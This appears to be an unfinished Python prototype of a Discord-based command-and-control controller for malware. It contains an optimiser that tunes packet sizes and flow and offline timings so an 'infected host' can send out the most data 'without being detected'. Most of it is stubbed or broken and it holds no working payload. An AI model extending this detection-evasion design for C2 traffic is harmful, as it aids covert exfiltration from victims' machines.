import discord, asyncio, aiohttp, json, time, jsonpickle, sys
from concurrent.futures import ProcessPoolExecutor, Future
from collections import deque
from queue import Queue
from random import randint
from scipy.optimize import OptimizeResult
import random
import numpy as np

TOKEN = "" # Get at discordapp.com/developers/applications/me

with open("tokenfile", "r") as f:
    TOKEN = f.readline().strip("\n")
    print(TOKEN)

class Controller:

    queueDict = {
        "NetworkFlowDurations" : [],
        "PacketSizes" : [],
        "CommandDelays" : [],
        "HeartbeatDelays" : [],
        "OfflineDurations" : []
    }

    def __init__(self):

        self.client = discord.Client()

        self.optimize_perturbation(self.get_happiness_test, [100000, 10000, 12000])

    def setup(self):

        @self.client.event
        @asyncio.coroutine
        async def on_ready():
            print('Logged in as')
            print(self.client.user.name + "\n" + self.client.user.id + "\n--------")



        @self.client.event
        @asyncio.coroutine
        async def on_message(message):
            channel = message.channel
            if message.startswith("MoreParams"):
                await self.generate_parameter_queues(channel)
            print(channel.name, channel.id)
            await get_messages(channel)
            #await self.client.send_message(channel, "GIT REKT SCRUB!! Channel name, channel id: " + channel.name + "   " + channel.id

        async def generate_parameter_queues(self, channel):
            return None




    def get_all_messages(self, channel):
        logs = yield from self.client.logs_from(channel, limit=10000)
        print(logs)
        for message in logs:
            print(message.content)

    def optimize_perturbation(self, function, pert_array, args=(), maxfev=None, stepsize_prc=0.05, maxiter=40, callback=None, **options):

        """
        Function that optimizes perturbation parameters by looking at all neighbough at a stepsize_prc% distance of the current parameter.

        args:
            function: the function that transmits the perturbation parameters along with a command to the infected host and waits for the response.
            pert_array: the list containing the 3 initial parameters that should be used by the malware.
            args: arguments passed to function
            maxfev:
            stepsize_prc: percentage perturbation on each parameter
            maxiter: maximum amount of iterations
            callback: callback function to run after a test has been performed

        returns:
            instance of OptimizeResult.
        """
        bestx = pert_array
        besty = function(pert_array, pert_array[0])
        funcalls = 1
        niter = 0
        improved = True
        stop = False

        # our looping conditions..
        while improved and not stop and niter < maxiter:
            improved = False
            niter += 1
            # Loop through dimensions; in our case only three
            for dim in range(np.size(pert_array)):
                # This loop perturbs the parameters, and tests them using the argument function - which in our case will be located on the malware
                # Consider treating the three dimensions differently, in the sense that bytes_size increases while dur_flow and dur_offline are set to random variables in an interval
                for s in [bestx[dim] * (1-stepsize_prc), bestx[dim] * (1 + stepsize_prc)]:
                    testx = np.copy(bestx)
                    testx[dim] = s
                    testy = function(testx, bestx[0])
                    funcalls += 1
                    # Need to get happiness feedback from the host. Could return the packet size if successful, 0 if not? Or maybe a normalized packet size?
                    # for each iteration, if the size is greater, receive a new multiplicative matrix that can be factored into the old one.
                    # Make a list over all the new matrices, determine which gives the highest yield in byte size and choose the greatest one.
                    if testy > besty:
                        besty = testy
                        bestx = testx
                        improved = True
                        print(bestx)

                    if callback is not None:
                        callback(bestx)
                    if maxfev is not None and funcalls >= maxfev:
                        stop = True
                        break
        return OptimizeResult(fun=besty, x=bestx, nit=niter, nfev=funcalls, success=(niter == maxiter))

    def get_happiness_test(self, vector, prev_size):
        """
        We must define happiness.

        Happiness could be a combination of proximity between network flow duration and offline duration, while maximizing bytes sent without being detected.
        Let's assume we have benchmark variables for flow_duration, flow_offline, bytes

        HAPPY (close to 1) if:
            amount of bytes >= benchmark bytes
            flow_duration != benchmark_duration and != previous_durations and varies based on a range threshold
            offline_duration != benchmark_offline and != previous_offline_durations and varies based on a range threshold (range threshold could be an average of differences)
        NOT HAPPY if:
            amount of bytes < benchmark bytes
            flow_duration == benchmark_duration or in threshold range of benchmark_duration
            offline_duration == benchmark_offline or in threshold range

        compute a new matrix that contains new parameters for multiplication with the old matrix.
        Ideally, the return value of this function is on the form: [aggregated_score, [multiplicative_size, multiplicative_duration, multiplicative_flow_len]]
        In initial call function, the aggregated_score parameter determines which perturbation is the best one.
        """
        x = prev_size
        if vector[0] > x:
            return random.uniform(0.5, 1)
        return random.uniform(0, 0.5)

    def run(self):

        try:
            self.client.run(TOKEN)
        except Exception:
            pass





if __name__ == '__main__':
    myobj = Controller()
